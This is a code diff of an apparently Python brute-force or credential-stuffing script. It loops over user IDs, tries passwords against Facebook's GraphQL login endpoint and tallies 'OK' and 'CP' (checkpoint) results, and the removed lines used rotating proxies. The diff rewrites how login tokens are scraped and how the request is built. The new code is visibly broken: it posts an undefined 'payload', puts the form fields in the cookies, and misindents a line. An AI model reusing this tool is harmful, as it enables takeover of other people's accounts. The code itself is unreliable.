@@ -42,91 +42,87 @@ for user in dx:
     sys.stdout.write(f"\r ⏳ (M5) ({loop}) (OK-{len(oks)}) (CP-{len(cps)})\r")
     sys.stdout.flush()
     try:
-        nip = random.choice(xvx)
-        proxs = {'http': nip}
-        Session = requests.Session()
-        free_fb = Session.get('https://m.facebook.com').text
-        lsd_value = re.search(r'name="lsd" value="(.*?)"', str(free_fb)).group(1)
-        jazoest_value = re.search(r'name="jazoest" value="(.*?)"', str(free_fb)).group(1)
+        # Step 1 – Load Facebook login page
+        r = session.get("https://www.facebook.com/login.php")
+        html = r.text
+
+        # Step 2 – Extract required tokens
+        def rex(pat):
+           m = re.search(pat, html)
+           return m.group(1) if m else ""
+    
+        lsd = rex(r'name="lsd" value="(.*?)"')
+        jazoest = rex(r'name="jazoest" value="(.*?)"')
+        __spin_r = rex(r'"__spin_r":(\d+)') or "0"
+        __spin_t = rex(r'"__spin_t":(\d+)') or str(int(time.time()))
+        __spin_b = rex(r'"__spin_b":"(.*?)"') or "trunk"
+        __rev = rex(r'"client_revision":(\d+)') or "0"
+        __hsi = rex(r'"hsi":"(.*?)"') or str(int(time.time()))
+        
+        # Step 3 – Generate dynamic IDs
+        guid = str(uuid.uuid4()).replace("-", "")[:16]
+        waterfall_id = str(uuid.uuid4())
+        lgnrnd = base64.b64encode(os.urandom(6)).decode()[:12]
+
+        # Step 4 – Build password in PWD_BROWSER format
         timestamp = str(int(time.time()))
-        data = {
-    'av': '0',
-    '__user': '0',
-    '__a': '1',
-    '__req': '7',
-    '__hs': '20294.HYP:comet_plat_default_pkg.2.1...0',
-    'dpr': '1',
-    '__ccg': 'GOOD',
-    '__rev': '1025144028',
-    '__s': '9i0mpn:tl7b2z:wtg4vs',
-    '__hsi': '7530975347099937606',
-    '__dyn': '7xeUmwlEnwn8K2Wmh0no6u5U4e0yoW3q32360CEbo1nEhw2nVE4W0qa0FE2awpUO0n24oaEd82lwv89k2C1Fwc60D82IzXwae4UaEW0Loco5G0zK5o4q0HU1IEGdwtU2ewbS1Lwqo15E6O1FwlU6KaxyU5N90HwtU5K0UEhwjE',
-    '__csr': 'g_8AltPmJcACp2qAarSaXyp8mKSGhbKJ2Vf-Hypp7GmiBO5lG8BC8CiuiB9btqaKBcIWGdyoKE8EcoaGwSyU8Uixmi5ESu487i3W2C-7E4-10yVooU2iwHwkGwnUaUb8iGA2e0Mo3MxicwkU2kw4Aw4Bwq8coy2u0-E2vxm0137UjgoQU08yS00jNO8G00OK8K09Nw1Jaaw7uzy0hU05P60cvw0ETo',
-    '__hsdp': 'gyxWxW43AIR1gOzQH88hUCUEk8yVah4Je6org-222SbUcU5y2OdyE0Ia3F2E1fUG3ma8PZ8w-q2y7Q5U460BU1f83Exe0NE0_C04DE2ow1E60X40bsxki0BC1Qw1nq04mo0oow2GU11E0qkw0EUw3i80xK09Pw',
-    '__hblp': '01SK05Bo0Du02XC0cswcC0bzw3XU0Uq0xo2nw1d61Jwg85C0lq3C0M811E0LG0uW0qG06OU0PG362u0l2mU5C1qw4gw77wkU0De',
-    '__sjsp': 'gyxWxW43AIR1gMiiIwx7yryxgybAF4iQUpxJ3U88boLwPwm8b8Saw2MEeAaw4_yEdoEzeQC49E4x1u11w9u0jO0W8jwcq029y0C80tKg0JO5h82mo7i05tE',
-    '__comet_req': '1',
-    'lsd': lsd_value,
-    'jazoest': jazoest_value,
-    '__spin_r': '1025144028',
-    '__spin_b': 'trunk',
-    '__spin_t': '1753441837',
-    'fb_api_caller_class': 'RelayModern',
-    'fb_api_req_friendly_name': 'useCDSWebLoginMutation',
-    'variables': json.dumps({
+        enc_pwd = f"#PWD_BROWSER:0:{timestamp}:{pw}"
+
+        # Step 5 – Get current doc_id for login mutation
+        # NOTE: This is scraped from the page JS. For demo, we set placeholder.
+        # You must update this by fetching / scraping when Facebook changes it.
+        doc_id = rex(r'"LoginMutation"\],\["(.*?)"') or "CURRENT_DOC_ID_HERE"
+        variables = {
         "input": {
             "client_mutation_id": "1",
             "actor_id": "0",
             "app": "facebook",
             "auth_domain_data_key": None,
             "caa_login_request_extra_info": {
-                "ab_test_data": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA////ffAFAA",
-                "cuid": "",
-                "guid": "ffed65de4275edc5a",
-                "jazoest": jazoest_value,
-                "lgndim": "eyJ3IjoxNDQwLCJoIjo5MDAsImF3IjoxNDQwLCJhaCI6ODYwLCJjIjoyNH0=",
-                "lgnjs": "1753441856",
-                "lgnrnd": "041037_s_DL",
-                "locale": "en_GB",
+                "guid": guid,
+                "jazoest": jazoest,
+                "lsd": lsd,
+                "lgnrnd": lgnrnd,
                 "login_source": "comet_headerless_login",
-                "lsd": lsd_value,
-                "next": "",
-                "prefill_contact_point": "",
-                "prefill_source": "",
-                "prefill_type": "",
-                "skstamp": "",
-                "timezone": "-330"
+                "locale": "en_GB",
+                "timezone": "0"
             },
             "credential_type": "password",
             "enc_password": {
-                "sensitive_string_value": f"#PWD_BROWSER:0:{timestamp}:{pw}"
+                "sensitive_string_value": enc_pwd
             },
-            "event_request_id": "fccafc56-7793-475a-82b0-79126c38dc00",
+            "event_request_id": str(uuid.uuid4()),
             "identifier": ids,
-            "ig_web_device_id": None,
-            "initial_request_id": "1",
-            "lids": None,
-            "login_source": "COMET_HEADERLESS_LOGIN",
-            "next": None,
             "password": {
-                "sensitive_string_value": f"#PWD_BROWSER:0:{timestamp}:{pw}"
+                "sensitive_string_value": enc_pwd
             },
             "persistent": True,
             "trusted_device_records": "{}",
-            "waterfall_id": "573eeb24-e791-4463-8ccd-00052da7c549"
+            "waterfall_id": waterfall_id
         },
         "scale": 1
-    }),
-    'server_timestamps': 'true',
-    'doc_id': '24540252778892185'
-}
+    }
         cookies = {
-        'fr': '0ODGLbVRuEomtBpGJ.AWcJOmSt3W2rnRxHjtxKo1Yma319i3y1R-IztAeSl7j2HS_wbr8.BoStZY..AAA.0.0.Bog2Yt.AWdENOnDWraylKWupKWZEBf1sQY',
-        'sb': 'WNZKaCfxN1H4fNVFPY3yVNM1',
-        'datr': 'WNZKaAorKsm5JROYCT_7VKaI',
-        'ps_l': '1',
-        'ps_n': '1',
-        'wd': '1072x739',}
+        "av": "0",
+        "__user": "0",
+        "__a": "1",
+        "__dyn": "",
+        "__csr": "",
+        "__req": "1",
+        "__hs": "",
+        "__rev": __rev,
+        "__hsi": __hsi,
+        "lsd": lsd,
+        "jazoest": jazoest,
+        "__spin_r": __spin_r,
+        "__spin_b": __spin_b,
+        "__spin_t": __spin_t,
+        "fb_api_caller_class": "RelayModern",
+        "fb_api_req_friendly_name": "useCDSWebLoginMutation",
+        "variables": json.dumps(variables),
+        "server_timestamps": "true",
+        "doc_id": doc_id
+    }
         headers = {
         'authority': 'www.facebook.com',
         'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
@@ -151,7 +147,7 @@ for user in dx:
         'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
         'viewport-width': '885',}
         url = 'https://www.facebook.com/api/graphql/'
-        result = Session.post(url, data=data, headers=headers).json()
+       result = session.post(url, data=payload, headers=headers).text
         print(result)
         if "session_key" in result:
             sb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
